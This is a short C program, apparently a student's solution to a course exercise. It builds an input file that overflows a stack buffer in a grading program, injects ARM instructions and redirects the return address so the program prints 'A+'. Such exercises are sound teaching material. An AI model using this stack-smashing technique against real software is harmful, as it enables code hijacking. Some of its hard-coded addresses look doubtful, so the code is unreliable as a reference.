#include <stdio.h>
#include "miniassembler.h"

int main(void) {
    FILE *dataAplus;
    unsigned int payloadAddress, printfAddress;
    unsigned int ldrInstr, bInstr;
    int i = 0;

    /* Open the dataAplus file for writing */
    dataAplus = fopen("dataAplus", "w+");

    /* Write the student name and a null byte, 12 characters */
    fprintf(dataAplus, "Alex & Matt");
    putc('\0', dataAplus);

    /*Addresses need to be adjusted based on actual memory layout */
    printfAddress = 0x400690; 

    payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064); 
    /*Overwrite the return address with our payload address*/
    fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);

    /*Payload: Set up register to point to "A+" string for printf*/
    ldrInstr = MiniAssembler_ldr(0, (unsigned long)"A+"); 
    fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);

    /* Branch to printf with "A+" string */
    bInstr = MiniAssembler_b(printfAddress, payloadAddress);
    fwrite(&bInstr, sizeof(bInstr), 1, dataAplus);

    /* Branch back to main function after getName */
    bInstr = MiniAssembler_b(0x40089c, 0x420070);
    fwrite(&bInstr, sizeof(unsigned int), 1, dataAplus);
    
    /* add padding to overrun the stack */
    fprintf(dataAplus, "%s", "anganganganganganggg"); /* 20 characters */

    /* write BSS address of adr instruction to file */
    fprintf(dataAplus, "%c", 0x64);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x42);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x00);
    fprintf(dataAplus, "%c", 0x00);
   
    /* Close the file*/
    fclose(dataAplus);
    return 0;
}
